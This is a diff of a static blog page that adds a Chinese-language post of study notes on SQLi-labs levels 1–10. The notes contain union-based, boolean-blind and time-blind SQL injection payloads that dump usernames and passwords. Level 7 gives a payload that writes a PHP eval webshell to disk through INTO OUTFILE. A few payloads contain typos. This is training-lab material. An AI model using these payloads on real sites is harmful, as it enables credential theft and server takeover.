@@ -73,6 +73,195 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql1-10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/07/sql1-10/" class="article-date">
+  <time class="dt-published" datetime="2024-02-07T13:56:54.000Z" itemprop="datePublished">2024-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/07/sql1-10/">sql1~10</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>基础知识</strong></p>
+<p>select system_user()&#x2F;user()显示系统用户</p>
+<p>select database()显示数据库</p>
+<p>select version()musql版本</p>
+<p>select @@database安装路径</p>
+<p>select @@version_compile_os 操纵系统</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第一关</strong></p>
+<p>?id&#x3D;1‘报错，说明我们所填入的内容被存在’   ’之间，会变成‘1’‘，mysql会报错</p>
+<ul>
+<li></li>
+</ul>
+<p>order by 1，2，3…查询有多少列</p>
+<ul>
+<li></li>
+</ul>
+<p>union select 1,2,schema_name from information_schema schemata–+</p>
+<p>取出数据库名(3处为回显点)</p>
+<ul>
+<li></li>
+</ul>
+<p>group_concat（）函数</p>
+<p>concat_ws(‘~’,A,B)函数</p>
+<p>&#x2F;?id&#x3D;-1’ union select 1,2,concat_ws(‘~’,username,password) from security.users–+</p>
+<p>取出username<del>password形式，最好将‘</del>’转换成0x+~的十六进制</p>
+<ul>
+<li></li>
+</ul>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+取出security库里面所有表</p>
+<p>其中table_schema&#x3D;’security’不推荐，会引入单引号问题，建议改成十六进制，0x＋security十六进制表示</p>
+<ul>
+<li></li>
+</ul>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+取出users表里的列数据</p>
+<ul>
+<li></li>
+</ul>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(password) from security.users–+取出security库users表password列对应的数据</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第二关</strong></p>
+<p>SELECT * FROM users WHERE id&#x3D;1’ LIMIT 0,1 这个报错说明原代码id&#x3D;后面没有’‘，因此没有必要加’</p>
+<p>其余部分跟第一关没有区别</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第三关</strong></p>
+<p>SELECT * FROM users WHERE id&#x3D;(‘1’) LIMIT 0,1 ，用（）包裹起来</p>
+<p>用1‘）–+注入，其他与前两关一样</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第四关</strong></p>
+<p>SELECT * FROM users WHERE id&#x3D;(“1”) LIMIT 0,1 </p>
+<p>用1“）–+注入，其他与前两关一样</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>基础知识</strong></p>
+<p>select left(database(),1)&#x3D;’s’   判断database（）前一位是否为s，是返回1，否返回0</p>
+<ul>
+<li></li>
+</ul>
+<p>regexp  匹配目标，如果成功返回1，失败返回0</p>
+<p>——select user（） regexp ’r‘，user（）结果为root，成立，返回1</p>
+<p>——select user（） regexp ’root‘，user（）结果为root，成立，返回1</p>
+<p>——select user（） regexp ’rot‘，user（）结果为root，不成立，返回0</p>
+<ul>
+<li></li>
+</ul>
+<p>like函数 和regexp类似，不过语句略有区别</p>
+<p>——select user（） like ’r%‘和——select user（） regexp ’r‘一个效果</p>
+<ul>
+<li></li>
+</ul>
+<p>substr(a,b,c)从b位置开始，截取a字符串c位长度</p>
+<p>——select database((select database()),1,1)&#x3D;’s’判断database（）第一位是否为s</p>
+<ul>
+<li></li>
+</ul>
+<p>ascii（）把里面的字符串转换成askii码</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第五关</strong></p>
+<p>布尔盲注——正确的时候输出一些语句，之前的方法没有回显点了，不能联合查询</p>
+<p>?id&#x3D;1’ order by 3–+最多到3，表明只有三列</p>
+<p>?id&#x3D;1’ and left((select database()),1)&#x3D;’s’–+返回正常，说明 left((select database()),1)&#x3D;’s’的值为1，第一位为s</p>
+<ul>
+<li></li>
+</ul>
+<p>用burp suite暴力破解，根据返回长度，看出正确字母</p>
+<ul>
+<li></li>
+</ul>
+<p>另一种方法：and ascii(substr((select schema_naame from information_schema.schemata limit,1,1),1,1))&gt;156 (通过二分法判断)</p>
+<p>通过上面方法获得数据库名</p>
+<p>其他部分依旧用同样方法来获得</p>
+<p><strong>第六关</strong></p>
+<p>第六关和第五关基本相同，不过把语句中的id&#x3D;‘xxx’变成了id&#x3D;“xxx”</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>补充知识</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查看 查看**<code>secure_file_priv</code>**的值 </p>
+<p>secure_file_priv &#96;为NULL禁止导出文件，默认值</p>
+<p>secure_file_priv&#96;指定地址限制导出地址只能在此 secure_file_priv&#x3D;”D:&#x2F;“</p>
+<p>secure_file_priv为空可以导出到任意文件 &#96;secure_file_priv&#x3D;</p>
+<ul>
+<li></li>
+</ul>
+<p>一句话木马</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>
+<ul>
+<li></li>
+</ul>
+<p>load file() 读取本地文件</p>
+<ul>
+<li></li>
+</ul>
+<p>‘内容’ into outfile ‘路径’ ‘名称’ 写入文件</p>
+<ul>
+<li></li>
+</ul>
+<p>if（condition，A，B）</p>
+<p>condition为true，A，condition判定为false，B</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第七关</strong></p>
+<p>？id&#x3D;-1’)) union select 1,2,’<code>&lt;?php @eval($_POST[&quot;crow&quot;];?&gt;</code>‘ into outfile ‘C:\xxx\Less-7\a.php’)–+</p>
+<p>写入一句话木马，用中国蚁剑破解（crow为密码），获得网站的webshell</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第八关</strong></p>
+<p>可以像第五关一样布尔盲注确定数据库名称等</p>
+<p>时间盲注?id&#x3D;1’ and if（askii(substr((select database()),1,1))&gt;10,1,sleep(5))–+然后再控制器里面看哪个值返回慢。这一句用来判断数据库长度，此方法也可以判断数据库名称内容等</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>第九关</strong></p>
+<p>布尔盲注不可用，无论布尔值为0，或者1，不会产生输出区别</p>
+<p>但是可以使用第八关时间盲注</p>
+<p><strong>第十关</strong></p>
+<p>和第九关大致上一样，把id&#x3D;’1‘换成了id&#x3D;“1”</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/07/sql1-10/" data-id="clu7pl2px000aq8b550jq0x5u" data-title="sql1~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/03/sql/" class="article-date">
@@ -157,7 +346,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/03/sql/" data-id="clu7pilyw000dr0b5ccn56viw" data-title="sql" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/03/sql/" data-id="clu7pl2py000dq8b59xur4toe" data-title="sql" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -252,7 +441,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/03/php/" data-id="clu7pilyv0009r0b5hhbl349e" data-title="php" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/03/php/" data-id="clu7pl2pw0006q8b5h7oj4zr2" data-title="php" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -311,7 +500,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/29/python/" data-id="clu7pilyv0008r0b596hb5zj4" data-title="python" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/01/29/python/" data-id="clu7pl2px0009q8b5fiwc1lvl" data-title="python" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -352,7 +541,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/22/baidu/" data-id="clu7pilyt0002r0b571kb59zi" data-title="baidu" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/01/22/baidu/" data-id="clu7pl2pv0003q8b51e8v8fuz" data-title="baidu" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -408,7 +597,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/21/%E4%BA%8C%E9%98%B6%E6%AE%B5/" data-id="clu7pilyy000kr0b51jpn1a7i" data-title="二阶段" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/01/21/%E4%BA%8C%E9%98%B6%E6%AE%B5/" data-id="clu7pl2q0000nq8b5dwj1gxvy" data-title="二阶段" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -484,7 +673,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/" data-id="clu7pilz0000mr0b50q08hj8r" data-title="前端基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/01/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/" data-id="clu7pl2q0000oq8b59959grx1" data-title="前端基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -556,15 +745,15 @@
           </li>
         
           <li>
+            <a href="/2024/03/20/vue/">vue</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/">java稍进阶</a>
           </li>
         
           <li>
             <a href="/2024/03/15/Java%E5%9F%BA%E7%A1%80/">Java基础</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/12/XXE/">XXE</a>
           </li>
         
       </ul>
